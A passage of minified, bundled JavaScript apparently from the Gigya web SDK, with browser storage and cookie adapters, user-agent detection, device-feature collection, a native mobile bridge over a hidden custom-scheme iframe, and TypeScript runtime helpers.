            var t = e.call(this) || this;
            return t.storage = window.sessionStorage, t;
          }
          return o.__extends(t, e), t.getName = function () {
            return "SessionStorageAdapter";
          }, t.isAvailable = function () {
            return r.localInfo.supportsSessionStorage;
          }, t;
        }(c),
        d = function (e) {
          function t() {
            return null !== e && e.apply(this, arguments) || this;
          }
          return o.__extends(t, e), t.isAvailable = function () {
            return r.localInfo.isFF && window.globalStorage;
          }, t.getName = function () {
            return "FirefoxStorageAdapter";
          }, t.prototype.getItem = function (e) {
            return window.globalStorage[location.hostname][e];
          }, t.prototype.setItem = function (e, t, n) {
            try {
              window.globalStorage[location.hostname][e] = t;
            } catch (e) {}
          }, t.prototype.removeItem = function (e) {
            delete window.globalStorage[location.hostname][e];
          }, t;
        }(s),
        p = function (e) {
          function t() {
            return null !== e && e.apply(this, arguments) || this;
          }
          return o.__extends(t, e), t.isAvailable = function () {
            return a.default.canSaveCookie();
          }, t.getName = function () {
            return "CookieStorageAdapter";
          }, t.prototype.getItem = function (e) {
            return a.default.get(e);
          }, t.prototype.setItem = function (e, t, n, o, i) {
            void 0 === i && (i = {}), a.default.set(e, t, n, o, i.dontUseRootPath, i.sameSite);
          }, t.prototype.removeItem = function (e) {
            a.default.remove(e);
          }, t;
        }(s);
      t.CookieStorageAdapter = p;
      var g = function (e) {
        function t() {
          var t = e.call(this) || this;
          return t.memory = {}, t;
        }
        return o.__extends(t, e), t.isAvailable = function () {
          return !0;
        }, t.getName = function () {
          return "MemoryStorageAdapter";
        }, t.prototype.getItem = function (e) {
          return this.memory[e];
        }, t.prototype.setItem = function (e, t, n) {
          this.memory[e] = t;
        }, t.prototype.removeItem = function (e) {
          delete this.memory[e];
        }, t.prototype.isPersistent = function () {
          return !1;
        }, t;
      }(s);
      function v(e) {
        var n = e.getName() || e.name;
        return t.instances[n] || (t.instances[n] = new e()), t.instances[n];
      }
      function h(e) {
        for (var n, o = 0, i = t.adapters; o < i.length; o++) {
          var r = i[o];
          if (r.isAvailable()) {
            if (r.prototype instanceof u && !e) continue;
            n = v(r);
            break;
          }
        }
        return n || (n = v(g)), e && (n instanceof u ? n.waitForService(function () {
          e(n);
        }) : e(n)), n;
      }
      t.MemoryStorageAdapter = g, t.adapters = [l, f, d, p, g], t.instances = {}, t.initializeAdapter = v, t.waitForService = h;
      var m = h();
      t.getItem = function (e) {
        return m.getItem(e);
      }, t.setItem = function (e, t, n) {
        return m.setItem(e, t, n);
      }, t.removeItem = function (e) {
        return m.removeItem(e);
      }, t.setObject = function (e, t) {
        return m.setObject(e, t);
      }, t.getObject = function (e, t) {
        return m.getObject(e, t);
      };
    },
    28: function (e, t) {
      Object.defineProperty(t, "__esModule", {
        value: !0
      });
      var n = function () {
        function e(e) {
          void 0 === e && (e = window), this._win = e;
        }
        return e.prototype.setCookie = function (e, t, n) {
          var o = e + "=" + escape(t);
          n.path && (o += "; path=" + n.path), n.expires && (o += "; expires=" + n.expires.toUTCString()), n.domain && -1 != n.domain.indexOf(".") && (o += "; domain=" + n.domain), n.sameSite && (o += "; sameSite=" + n.sameSite), n.secure && (o += "; secure"), this._win.document.cookie = o;
        }, e.prototype.getCookie = function (e) {
          e = e.replace(/([.*+?^=!:${}()|[\]\/\\])/g, "\\$1").replace(/^[ \t]+|[ \t]+$/g, "");
          var t = new RegExp("(?:^|;)\\s?" + e + "=(.*?)(?:;|$)"),
            n = this._win.document.cookie.match(t);
          return n && unescape(n[1]);
        }, e;
      }();
      t.CookieStore = n;
    },
    3: function (e, t, n) {
      Object.defineProperty(t, "__esModule", {
        value: !0
      });
      var o = n(0),
        i = navigator.userAgent.toLowerCase();
      t.localInfo = {
        baseDomain: "",
        isBrowserSupportsFilesAPI: "function" == typeof FileReader || "object" == typeof FileReader,
        initTime: new Date(),
        version: 0,
        pageDomain: document.location.hostname,
        protocol: "http:" == document.location.protocol ? "http" : "https",
        userAgent: i,
        isWin: -1 != i.indexOf("win"),
        isIE: -1 != i.indexOf("msie") || -1 != i.indexOf("mozilla") && -1 != i.indexOf("trident"),
        isIE6: -1 != i.indexOf("msie 6."),
        isIE7: -1 != i.indexOf("msie 7."),
        isIE8: -1 != i.indexOf("msie 8."),
        isIE9: -1 != i.indexOf("msie 9."),
        isIE10: -1 != i.indexOf("msie 10."),
        isIE11: -1 != i.indexOf("mozilla") && -1 != i.indexOf("trident/7.0"),
        isEdgeLegacy: -1 != i.indexOf("edge"),
        isEdge: RegExp(/edg(?!e)/).test(i),
        isIOS: -1 != i.indexOf("iphone") || -1 != i.indexOf("ipad") || -1 != i.indexOf("ipod"),
        isSafari534: -1 != i.indexOf("safari/534"),
        isWeChat: -1 != i.indexOf("micromessenger"),
        iosVersion: -1 != i.indexOf("applewebkit") && -1 != i.indexOf("version/") ? parseInt(i.split("version/")[1].split(" ")[0]) : 0,
        isAndroid: -1 != i.indexOf("android"),
        isAndroidBrowser: function (e) {
          if (-1 === e.indexOf("mozilla/5.0")) return !1;
          if (-1 === e.indexOf("android 4")) return !1;
          if (-1 === e.indexOf("applewebkit")) return !1;
          if (-1 !== e.indexOf("windows phone")) return !1;
          var t = /chrome\/(\d+)/.exec(e);
          return !t || parseInt(t[1]) < 20;
        }(i),
        currentBrowser: "",
        androidVersion: -1 != i.indexOf("android") ? parseFloat(i.slice(i.indexOf("android") + 8)) : 0,
        isChrome: -1 != i.indexOf("chrome") && -1 == i.indexOf("edg"),
        isGoogleBot: -1 != i.indexOf("googlebot"),
        isFF: -1 != i.indexOf("firefox"),
        isOpera: -1 != i.indexOf("opera"),
        isSafari: navigator.appVersion && -1 != navigator.appVersion.toLowerCase().indexOf("safari") && -1 == navigator.appVersion.toLowerCase().indexOf("chrome") && -1 == i.indexOf("android"),
        isIOSWebView: /(iPhone|iPod|iPad).*AppleWebKit(?!.*Safari)/i.test(navigator.userAgent),
        isIOSChrome: -1 != i.indexOf("crios"),
        isMAC: navigator.appVersion && -1 != navigator.appVersion.toLowerCase().indexOf("mac"),
        isWindowsPhone: -1 != i.indexOf("windows phone"),
        isFacebookBrowser: -1 != i.indexOf("fban") || -1 != i.indexOf("fbav"),
        supportsPostMessage: null != window.postMessage && (-1 == i.indexOf("msie") || -1 != i.indexOf("iemobile")),
        supportsLocalStorage: !1,
        supportsSessionStorage: !1,
        supportsFlash: function () {
          var e = !1;
          try {
            if (navigator.mimeTypes && null != navigator.mimeTypes["application/x-shockwave-flash"] && navigator.mimeTypes["application/x-shockwave-flash"].enabledPlugin) e = !0;else new ActiveXObject("ShockwaveFlash.ShockwaveFlash") && (e = !0);
          } catch (e) {}
          return e;
        }(),
        quirksMode: "BackCompat" == document.compatMode && -1 != i.indexOf("msie"),
        backCompat: "BackCompat" == document.compatMode,
        isMobile: function () {
          var e = ["iphone", "ipod", "android", "midp", "240x320", "blackberry", "netfront", "nokia", "panasonic", "portalmmm", "sharp", "sie-", "sonyericsson", "symbian", "windows ce", "benq", "mda", "mot-", "opera mini", "philips", "pocket pc", "sagem", "samsung", "htc"];
          for (var t in e) if (-1 != i.indexOf(e[t])) return !0;
          return !1;
        }(),
        isMobileApp: function () {
          if (!document.getElementsByTagName) return !1;
          for (var e = document.getElementsByTagName("meta"), t = 0; t < e.length; t++) if ("viewport" == e[t].getAttribute("name")) {
            var n = e[t].getAttribute("content");
            if (n && -1 !== n.indexOf("width=device-width")) return !0;
          }
          return !1;
        }(),
        isNativeMobileApp: !1,
        isTouch: function () {
          if ("ontouchstart" in window) return !0;
          if ("onmsgesturechange" in window) try {
            return new ActiveXObject("htmlfile"), !1;
          } catch (e) {
            return !0;
          }
          return !1;
        }(),
        isOnLine: function () {
          return navigator.onLine;
        },
        messagingMethod: 1
      };
      var r = function (e) {
        try {
          var t = window[e];
          if (!t) return !1;
          var n = "_gig_localStorage_test",
            o = "just checking for localStorage";
          t.setItem(n, o);
          var i = t.getItem(n) === o;
          return t.removeItem(n), i;
        } catch (e) {
          return !1;
        }
      };
      t.localInfo.supportsLocalStorage = r("localStorage"), t.localInfo.supportsSessionStorage = r("sessionStorage"), t.localInfo.isMAC = t.localInfo.isMAC && !t.localInfo.isIOS;
      var a = t.localInfo.isWin ? "windows" : t.localInfo.isWindowsPhone ? "winphone" : t.localInfo.isIOS ? "ios-v" + t.localInfo.iosVersion : t.localInfo.isMAC ? "mac" : t.localInfo.isAndroid ? "android" : "";
      a && (a += " ");
      var s = t.localInfo.isChrome ? "chrome" : t.localInfo.isFF ? "firefox" : t.localInfo.isSafari ? "safari" : t.localInfo.isEdge ? "edge" : t.localInfo.isEdgeLegacy ? "edge legacy" : t.localInfo.isIE11 ? "ie11" : t.localInfo.isIE10 ? "ie10" : t.localInfo.isIE9 ? "ie9" : t.localInfo.isIE8 ? "ie8" : "";
      t.localInfo.currentBrowser = a + s;
      var u = function () {
        function e(e, t) {
          void 0 === e && (e = window.gigya._.WindowProvider.navigator()), void 0 === t && (t = window.gigya._.WindowProvider.screen()), this.navigator = e, this.screen = t, this.collectData();
        }
        return e.prototype.collectData = function () {
          var e, t, n, i, r, a, s;
          return o.__awaiter(this, void 0, void 0, function () {
            var u, c, l, f, d, p, g, v;
            return o.__generator(this, function (o) {
              switch (o.label) {
                case 0:
                  return this.userAgent = null === (e = this.navigator) || void 0 === e ? void 0 : e.userAgent, this.plugins = Array.from((null === (t = this.navigator) || void 0 === t ? void 0 : t.plugins) || []).map(function (e) {
                    return {
                      name: e.name,
                      filename: e.filename,
                      length: e.length
                    };
                  }), this.localTime = new Date().toLocaleTimeString(), this.timezoneOffset = new Date().getTimezoneOffset(), [4, null === (i = null === (n = this.navigator) || void 0 === n ? void 0 : n.permissions) || void 0 === i ? void 0 : i.query({
                    name: "notifications"
                  })];
                case 1:
                  return (u = o.sent()) && (c = u.state, this.permissionStatus = {
                    state: c
                  }), this.webdriver = null === (r = this.navigator) || void 0 === r ? void 0 : r.webdriver, (f = this.navigator.getBattery) ? [4, this.navigator.getBattery()] : [3, 3];
                case 2:
                  f = o.sent(), o.label = 3;
                case 3:
                  return (l = f) && (d = l.charging, p = l.chargingTime, g = l.dischargingTime, v = l.level, this.batteryInfo = {
                    charging: d,
                    chargingTime: p,
                    dischargingTime: g,
                    level: v
                  }), this.features = [(null === (a = this.navigator) || void 0 === a ? void 0 : a.maxTouchPoints) || (null === (s = this.navigator) || void 0 === s ? void 0 : s.msMaxTouchPoints), this.screen.width + "|" + this.screen.height + "|" + this.screen.colorDepth, this.navigator.javaEnabled(), "sendBeacon" in this.navigator], [2];
              }
            });
          });
        }, e;
      }();
      t.ClientFeature = u;
    },
    314: function (e, t, n) {
      (function (e) {
        Object.defineProperty(t, "__esModule", {
          value: !0
        });
        var o = n(315),
          i = n(316);
        window.gigya._ || (window.gigya._ = {}), window.gigya._.apiAdapters || (window.gigya._.apiAdapters = {}), window.gigya._.apiAdapters.mobile || (window.gigya._.apiAdapters.mobile = {}), e(window.gigya._.apiAdapters.mobile, o, i);
      }).call(this, n(0).__assign);
    },
    315: function (e, t, n) {
      Object.defineProperty(t, "__esModule", {
        value: !0
      });
      var o = n(0),
        i = n(14);
      t.newApiAdapter = function (e) {
        return new s(e);
      }, t.mobileCallbacks = {};
      var r = ["is_session_valid", "send_request", "send_oauth_request", "get_ids", "on_plugin_event", "on_custom_event", "register_for_namespace_events"],
        a = {
          logLevel: []
        },
        s = function () {
          function e(e) {
            this.nativeProxy = e, this._storage = new i.MemoryStorageAdapter(), this.name = "Mobile";
          }
          return e.prototype.getStorage = function () {
            return this._storage;
          }, e.prototype.init = function (e) {
            return o.__awaiter(this, void 0, void 0, function () {
              var t = this;
              return o.__generator(this, function (n) {
                return this.nativeProxy && "function" == typeof this.nativeProxy.getFeatures ? this.features = window.gigya.utils.JSON.deserialize(this.nativeProxy.getFeatures()) : this.features = r, this.nativeProxy && "function" == typeof this.nativeProxy.getSettings ? (this.settings = window.gigya.utils.JSON.deserialize(this.nativeProxy.getSettings()), this.settings.logLevel = window.gigya.utils.array.getArrayFromString(this.settings.logLevel || a.logLevel.join(","), ",")) : this.settings = a, this.nativeProxy && "function" == typeof this.nativeProxy.getObfuscationStrategy && (this.obfuscationStrategy = this.nativeProxy.getObfuscationStrategy()), window.gigya._.getApiDomain = window.gigya._.apiDomainFactory(window.gigya.partnerSettings.plugins.apiDomain, window.gigya.defaultApiDomain), window.gigya.events.addMap({
                  defaultMethod: function (e) {
                    t.onPluginEvent(e);
                  },
                  eventMap: [{
                    events: "*",
                    args: ["$event"]
                  }]
                }), this.sendToMobile("get_ids", {}, function (n) {
                  for (var o in t.ucid = n.ucid, t.gcid = n.gcid, window.gigya.events.global._activeNamespaces) t.registerForNamespaceEvents(o);
                  e();
                }), [2];
              });
            });
          }, e.prototype.getTokenParam = function (e, t) {
            return "";
          }, e.prototype.onPluginEvent = function (e) {
            e.isGlobal || this.sendToMobile("on_plugin_event", e);
          }, e.prototype.onCustomEvent = function (e) {
            this.sendToMobile("on_custom_event", e);
          }, e.prototype.onJSLog = function (e, t) {
            if (this.isLogLevelSupported(e)) {
              var n = {
                logType: e,
                logInfo: t
              };
              this.sendToMobile("on_js_log", n);
            }
          }, e.prototype.registerForNamespaceEvents = function (e) {
            this.sendToMobile("register_for_namespace_events", {
              namespace: e
            });
          }, e.prototype.getGmidTicket = function (e) {
            return o.__awaiter(this, void 0, void 0, function () {
              var t, n;
              return o.__generator(this, function (o) {
                return e ? (t = {
                  expires: 30
                }, n = {
                  forceHttps: !0
                }, this.sendRequest("socialize.getGmidTicket", t, function (t) {
                  e(t.gmidTicket);
                }, n), [2, ""]) : [2];
              });
            });
          }, e.prototype.clearSession = function (e, t) {
            this.sendToMobile("clear_session", e, t);
          }, e.prototype.isSessionValid = function (e, t) {
            this.sendToMobile("is_session_valid", {}, t);
          }, e.prototype.sendRequest = function (e, t, n, o) {
            this.sendToMobile("send_request", t, n, e, o);
          }, e.prototype.sendOauthRequest = function (e, t, n, o) {
            this.sendToMobile("send_oauth_request", t, n, e, o);
          }, e.prototype.sendToMobile = function (e, n, o, i, r) {
            var a = this;
            if (void 0 === i && (i = ""), this.isActionSupported(e)) {
              n && delete n.APIKey;
              var s = "";
              o && (s = new Date().getTime() + "_" + Math.random(), t.mobileCallbacks[s] = function (e) {
                o(a.unobfuscate(e, !0)), delete t.mobileCallbacks[s];
              });
              var u = this.obfuscate(window.gigya.utils.keyValue.serialize(n)),
                c = window.gigya.utils.keyValue.serialize(r),
                l = "callbackID=" + s + "&params=" + encodeURIComponent(u) + "&settings=" + encodeURIComponent(c);
              if (this.nativeProxy.sendToMobile) {
                if (!this.nativeProxy.sendToMobile(e, i, l)) {
                  var f = "The Native Mobile SDK does not support feature " + e;
                  window.gigya.logger.error(f), t.mobileCallbacks[s]({
                    errorCode: 400096,
                    errorMessage: f
                  });
                }
              } else this.sendWithIframe(e, i, l, s);
            } else o && o({
              errorCode: 400096,
              errorMessage: "Mobile SDK does not support feature " + e
            });
          }, e.prototype.sendWithIframe = function (e, n, o, i) {
            var r = document.createElement("iframe");
            function a() {
              if (r) try {
                document.documentElement.removeChild(r), r.remove();
              } catch (e) {}
            }
            if (r.style.display = "none", r.src = "gsapi://" + e + "/" + n + "?" + o, i && t.mobileCallbacks[i]) {
              var s = t.mobileCallbacks[i];
              t.mobileCallbacks[i] = function (e) {
                s(e), a();
              };
            } else window.setTimeout(function () {
              return a();
            }, 300);
            window.setTimeout(function () {
              return document.documentElement.appendChild(r);
            }, 0);
          }, e.prototype.onSDKEvent = function (e) {
            e && e.user && window.gigya._.convertIdentitiesArrayToObject(e.user), window.gigya.events.global.dispatch(e);
          }, e.prototype.isActionSupported = function (e) {
            return !!e && window.gigya.utils.array.indexOf(this.features, e) > -1;
          }, e.prototype.isLogLevelSupported = function (e) {
            return -1 != window.gigya.utils.array.indexOf(this.settings.logLevel, "*") || -1 != window.gigya.utils.array.indexOf(this.settings.logLevel, e);
          }, e.prototype.setGltexpFromSSO = function (e) {
            return gigya.Promise.resolve(!1);
          }, e.prototype.obfuscate = function (e) {
            return "base64" === this.obfuscationStrategy ? btoa(e) : e;
          }, e.prototype.unobfuscate = function (e, t) {
            if ("base64" === this.obfuscationStrategy) {
              var n = atob(e);
              return t ? JSON.parse(n) : n;
            }
            return e;
          }, e;
        }();
      t.MobileAdapter = s;
    },
    316: function (e, t) {
      Object.defineProperty(t, "__esModule", {
        value: !0
      }), t.showPlugin = function (e, t) {
        var n = e.split("."),
          o = n.splice(n.length - 1, 1)[0];
        n.length || (n = ["socialize"]), "commentsUI" == e && (n = ["comments"]);
        var i = "show" + window.gigya.utils.stringUtils.capitalize(o);
        n.push(i);
        for (var r = window.gigya; r && n.length;) r = r[n.shift()];
        if ("function" != typeof r) return window.gigya.events.dispatchInvalidParamError(window.gigya.utils.object.merge([{
          plugin: e
        }, t]), "plugin");
        r(t);
      };
    },
    5: function (module, exports) {
      function serialize(e, t, n, o, i) {
        if (void 0 === t && (t = !1), void 0 === n && (n = !1), void 0 === o && (o = 0), void 0 === i && (i = 20), window.gigya.localInfo.isIE8) {
          if (o || (o = 0), o > i) return "[Too deep]";
          var r = "",
            a = "",
            s = "";
          if (n) {
            s = "\t", a = "\n";
            for (var u = 0; u < o + 1; u++) r += s;
          }
          var c = typeof e;
          if ("function" == c) return c.toString();
          if ("object" != c || null === e) return "string" == c && (e = '"' + e.replace(/(\"|\\)/g, "\\$1").replace(/\r\n|\r|\n/g, "\\n") + '"'), String(e);
          var l,
            f,
            d = [],
            p = e && e.constructor == Array;
          if (p) for (u = 0; u < e.length; u++) c = typeof (f = e[u]), null == f || "undefined" == c ? f = "" : "string" == c ? f = '"' + f.replace(/(\"|\\)/g, "\\$1").replace(/\r\n|\r|\n/g, "\\n") + '"' : "function" == c ? f = t ? "Function" : "" : f.parentNode && f.innerHTML ? f = "HTMLElement" : f.constructor == Date ? f = "" : "object" == c && null !== f && (f = serialize(f, t, n, o + 1)), "" != String(f) && d.push(r + s + String(f));else for (l in e) c = typeof (f = e[l]), null == f || "undefined" == c ? f = String(f) : "string" == c ? f = '"' + f.replace(/(\"|\\)/g, "\\$1").replace(/\r\n|\r|\n/g, "\\n") + '"' : "function" == c ? f = t ? "Function" : "" : f.parentNode && f.innerHTML ? f = "HTMLElement" : f.constructor == Date ? f = "" : "object" == c && null !== f && (f = a + serialize(f, t, n, o + 1)), "" != String(f) && d.push(r + s + '"' + l.replace(/(\"|\\)/g, "\\$1").replace(/\r\n|\r|\n/g, "\\n") + '":' + String(f));
          return a + r + (p ? "[" : "{") + a + d.join("," + a) + a + r + (p ? "]" : "}");
        }
        return window.JSON.stringify(e);
      }
      function deserialize(json, defaultValue, scope) {
        if (!json || !json.replace(/^\s+|\s+$/g, "")) return defaultValue || {};
        try {
          var keys = [],
            values = [];
          if (scope) for (var key in scope) keys.push(key), values.push(scope[key]);
          var fn = eval("(function(" + keys.join(",") + ") { return " + json.trim() + "; })");
          return fn.apply(void 0, values);
        } catch (e) {
          return console.warn("Error deserializing JavaScript", e), defaultValue || {};
        }
      }
      function parse(e, t) {
        if (window.gigya.localInfo.isIE8) return deserialize(e, t);
        try {
          return window.JSON.parse(e);
        } catch (e) {
          return t || {};
        }
      }
      Object.defineProperty(exports, "__esModule", {
        value: !0
      }), exports.serialize = serialize, exports.deserialize = deserialize, exports.parse = parse;
    }
  });
  // end API adapters
  /*! For license information please see gigya.min.js.LICENSE.txt */
  !function (e) {
    var t = {};
    function n(i) {
      if (t[i]) return t[i].exports;
      var o = t[i] = {
        i: i,
        l: !1,
        exports: {}
      };
      return e[i].call(o.exports, o, o.exports, n), o.l = !0, o.exports;
    }
    n.m = e, n.c = t, n.d = function (e, t, i) {
      n.o(e, t) || Object.defineProperty(e, t, {
        enumerable: !0,
        get: i
      });
    }, n.r = function (e) {
      "undefined" != typeof Symbol && Symbol.toStringTag && Object.defineProperty(e, Symbol.toStringTag, {
        value: "Module"
      }), Object.defineProperty(e, "__esModule", {
        value: !0
      });
    }, n.t = function (e, t) {
      if (1 & t && (e = n(e)), 8 & t) return e;
      if (4 & t && "object" == typeof e && e && e.__esModule) return e;
      var i = Object.create(null);
      if (n.r(i), Object.defineProperty(i, "default", {
        enumerable: !0,
        value: e
      }), 2 & t && "string" != typeof e) for (var o in e) n.d(i, o, function (t) {
        return e[t];
      }.bind(null, o));
      return i;
    }, n.n = function (e) {
      var t = e && e.__esModule ? function () {
        return e.default;
      } : function () {
        return e;
      };
      return n.d(t, "a", t), t;
    }, n.o = function (e, t) {
      return Object.prototype.hasOwnProperty.call(e, t);
    }, n.p = "", n(n.s = 235);
  }([function (e, t, n) {
    "use strict";

    n.r(t), function (e) {
      n.d(t, "__extends", function () {
        return o;
      }), n.d(t, "__assign", function () {
        return r;
      }), n.d(t, "__rest", function () {
        return a;
      }), n.d(t, "__decorate", function () {
        return s;
      }), n.d(t, "__param", function () {
        return c;
      }), n.d(t, "__metadata", function () {
        return u;
      }), n.d(t, "__awaiter", function () {
        return l;
      }), n.d(t, "__generator", function () {
        return d;
      }), n.d(t, "__exportStar", function () {
        return g;
      }), n.d(t, "__values", function () {
        return f;
      }), n.d(t, "__read", function () {
        return p;
      }), n.d(t, "__spread", function () {
        return h;
      }), n.d(t, "__spreadArrays", function () {
        return v;
      }), n.d(t, "__await", function () {
        return y;
      }), n.d(t, "__asyncGenerator", function () {
        return w;
      }), n.d(t, "__asyncDelegator", function () {
        return m;
      }), n.d(t, "__asyncValues", function () {
        return _;
      }), n.d(t, "__makeTemplateObject", function () {
        return b;
      }), n.d(t, "__importStar", function () {
        return S;
      }), n.d(t, "__importDefault", function () {
        return P;
      }), n.d(t, "__classPrivateFieldGet", function () {
        return A;
      }), n.d(t, "__classPrivateFieldSet", function () {
        return I;
      });
      var i = function (e, t) {
        return (i = Object.setPrototypeOf || {
          __proto__: []
        } instanceof Array && function (e, t) {
          e.__proto__ = t;
        } || function (e, t) {
          for (var n in t) t.hasOwnProperty(n) && (e[n] = t[n]);
        })(e, t);
      };
      function o(e, t) {
        function n() {
          this.constructor = e;
        }
        i(e, t), e.prototype = null === t ? Object.create(t) : (n.prototype = t.prototype, new n());
      }
      var r = function () {
        return (r = e || function (e) {
          for (var t, n = 1, i = arguments.length; n < i; n++) for (var o in t = arguments[n]) Object.prototype.hasOwnProperty.call(t, o) && (e[o] = t[o]);
          return e;
        }).apply(this, arguments);
      };
      function a(e, t) {
        var n = {};
        for (var i in e) Object.prototype.hasOwnProperty.call(e, i) && t.indexOf(i) < 0 && (n[i] = e[i]);
        if (null != e && "function" == typeof Object.getOwnPropertySymbols) {
          var o = 0;
          for (i = Object.getOwnPropertySymbols(e); o < i.length; o++) t.indexOf(i[o]) < 0 && Object.prototype.propertyIsEnumerable.call(e, i[o]) && (n[i[o]] = e[i[o]]);
        }
        return n;
      }
      function s(e, t, n, i) {
        var o,
          r = arguments.length,
          a = r < 3 ? t : null === i ? i = Object.getOwnPropertyDescriptor(t, n) : i;
        if ("object" == typeof Reflect && "function" == typeof Reflect.decorate) a = Reflect.decorate(e, t, n, i);else for (var s = e.length - 1; s >= 0; s--) (o = e[s]) && (a = (r < 3 ? o(a) : r > 3 ? o(t, n, a) : o(t, n)) || a);
        return r > 3 && a && Object.defineProperty(t, n, a), a;
      }
      function c(e, t) {
        return function (n, i) {
          t(n, i, e);
        };
      }
      function u(e, t) {
        if ("object" == typeof Reflect && "function" == typeof Reflect.metadata) return Reflect.metadata(e, t);
      }
      function l(e, t, n, i) {
        return new (n || (n = gigya.Promise))(function (o, r) {
          function a(e) {
            try {
              c(i.next(e));
            } catch (e) {
              r(e);
            }
          }
          function s(e) {
            try {
              c(i.throw(e));
            } catch (e) {
              r(e);
            }
          }
          function c(e) {
            var t;
            e.done ? o(e.value) : (t = e.value, t instanceof n ? t : new n(function (e) {
              e(t);
            })).then(a, s);
          }
          c((i = i.apply(e, t || [])).next());
        });
      }
      function d(e, t) {
        var n,
          i,
          o,
          r,
          a = {
            label: 0,
            sent: function () {
              if (1 & o[0]) throw o[1];
              return o[1];
            },
            trys: [],
            ops: []
          };
        return r = {
          next: s(0),
          throw: s(1),
          return: s(2)
        }, "function" == typeof Symbol && (r[Symbol.iterator] = function () {
          return this;
        }), r;
        function s(r) {
          return function (s) {
            return function (r) {
              if (n) throw new TypeError("Generator is already executing.");
              for (; a;) try {
                if (n = 1, i && (o = 2 & r[0] ? i.return : r[0] ? i.throw || ((o = i.return) && o.call(i), 0) : i.next) && !(o = o.call(i, r[1])).done) return o;
                switch (i = 0, o && (r = [2 & r[0], o.value]), r[0]) {
                  case 0:
                  case 1:
                    o = r;
                    break;
                  case 4:
                    return a.label++, {
                      value: r[1],
                      done: !1
                    };
                  case 5:
                    a.label++, i = r[1], r = [0];
                    continue;
                  case 7:
                    r = a.ops.pop(), a.trys.pop();
                    continue;
                  default:
                    if (!(o = a.trys, (o = o.length > 0 && o[o.length - 1]) || 6 !== r[0] && 2 !== r[0])) {
                      a = 0;
                      continue;
                    }
                    if (3 === r[0] && (!o || r[1] > o[0] && r[1] < o[3])) {
                      a.label = r[1];
                      break;
                    }
                    if (6 === r[0] && a.label < o[1]) {
                      a.label = o[1], o = r;
                      break;
                    }
                    if (o && a.label < o[2]) {
                      a.label = o[2], a.ops.push(r);
                      break;
                    }
                    o[2] && a.ops.pop(), a.trys.pop();
                    continue;
                }
                r = t.call(e, a);
              } catch (e) {
                r = [6, e], i = 0;
              } finally {
                n = o = 0;
              }
              if (5 & r[0]) throw r[1];
              return {
                value: r[0] ? r[1] : void 0,
                done: !0
              };
            }([r, s]);
          };
        }
      }
      function g(e, t) {
        for (var n in e) t.hasOwnProperty(n) || (t[n] = e[n]);
      }
      function f(e) {
        var t = "function" == typeof Symbol && Symbol.iterator,
          n = t && e[t],
          i = 0;
        if (n) return n.call(e);
        if (e && "number" == typeof e.length) return {
          next: function () {
            return e && i >= e.length && (e = void 0), {
              value: e && e[i++],
              done: !e
            };
          }
        };
        throw new TypeError(t ? "Object is not iterable." : "Symbol.iterator is not defined.");
      }
      function p(e, t) {
        var n = "function" == typeof Symbol && e[Symbol.iterator];
        if (!n) return e;
        var i,
          o,
          r = n.call(e),
          a = [];
        try {
          for (; (void 0 === t || t-- > 0) && !(i = r.next()).done;) a.push(i.value);
        } catch (e) {
          o = {
            error: e
          };
        } finally {
          try {
            i && !i.done && (n = r.return) && n.call(r);
          } finally {
            if (o) throw o.error;
          }
        }
        return a;
      }
      function h() {
        for (var e = [], t = 0; t < arguments.length; t++) e = e.concat(p(arguments[t]));
        return e;
      }
      function v() {
        for (var e = 0, t = 0, n = arguments.length; t < n; t++) e += arguments[t].length;
        var i = Array(e),
          o = 0;
        for (t = 0; t < n; t++) for (var r = arguments[t], a = 0, s = r.length; a < s; a++, o++) i[o] = r[a];
        return i;
      }
      function y(e) {
        return this instanceof y ? (this.v = e, this) : new y(e);
      }
      function w(e, t, n) {
        if (!Symbol.asyncIterator) throw new TypeError("Symbol.asyncIterator is not defined.");
        var i,
          o = n.apply(e, t || []),
          r = [];
        return i = {}, a("next"), a("throw"), a("return"), i[Symbol.asyncIterator] = function () {
          return this;
        }, i;
        function a(e) {
          o[e] && (i[e] = function (t) {
            return new gigya.Promise(function (n, i) {
              r.push([e, t, n, i]) > 1 || s(e, t);
            });
          });
        }
        function s(e, t) {
          try {
            (n = o[e](t)).value instanceof y ? gigya.Promise.resolve(n.value.v).then(c, u) : l(r[0][2], n);
          } catch (e) {
            l(r[0][3], e);
          }
          var n;
        }
        function c(e) {
          s("next", e);
        }
        function u(e) {
          s("throw", e);
        }
        function l(e, t) {
          e(t), r.shift(), r.length && s(r[0][0], r[0][1]);
        }
      }
      function m(e) {
        var t, n;
        return t = {}, i("next"), i("throw", function (e) {
          throw e;
        }), i("return"), t[Symbol.iterator] = function () {
          return this;
        }, t;
        function i(i, o) {
          t[i] = e[i] ? function (t) {
            return (n = !n) ? {
              value: y(e[i](t)),
              done: "return" === i
            } : o ? o(t) : t;
          } : o;
        }
      }
      function _(e) {
        if (!Symbol.asyncIterator) throw new TypeError("Symbol.asyncIterator is not defined.");
        var t,
          n = e[Symbol.asyncIterator];
        return n ? n.call(e) : (e = f(e), t = {}, i("next"), i("throw"), i("return"), t[Symbol.asyncIterator] = function () {
          return this;
        }, t);
        function i(n) {
          t[n] = e[n] && function (t) {
            return new gigya.Promise(function (i, o) {
              (function (e, t, n, i) {
                gigya.Promise.resolve(i).then(function (t) {
                  e({
                    value: t,
                    done: n
                  });
                }, t);
              })(i, o, (t = e[n](t)).done, t.value);
            });
          };
        }
      }
      function b(e, t) {
        return Object.defineProperty ? Object.defineProperty(e, "raw", {
          value: t
        }) : e.raw = t, e;
      }
      function S(e) {
        if (e && e.__esModule) return e;
        var t = {};
        if (null != e) for (var n in e) Object.hasOwnProperty.call(e, n) && (t[n] = e[n]);
        return t.default = e, t;
      }
      function P(e) {
        return e && e.__esModule ? e : {
          default: e
        };
      }
      function A(e, t) {
        if (!t.has(e)) throw new TypeError("attempted to get private field on non-instance");
        return t.get(e);
      }
      function I(e, t, n) {
        if (!t.has(e)) throw new TypeError("attempted to set private field on non-instance");
        return t.set(e, n), n;
      }
    }.call(this, n(0).__assign);
  },, function (e, t) {
    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var n = function () {
      function e() {}
      return Object.defineProperty(e, "forceWebSdkBootstrap", {
        get: function () {
          return this.get("forceWebSdkBootstrap");
        },
        enumerable: !0,
        configurable: !0
      }), Object.defineProperty(e, "useGigyaJsBaseDomain", {
        get: function () {
          return this.get("useGigyaJsBaseDomain");
        },
        enumerable: !0,
        configurable: !0
      }), Object.defineProperty(e, "hideSSOFrame", {
        get: function () {
          return this.get("hideSSOFrame");
        },
        enumerable: !0,
        configurable: !0
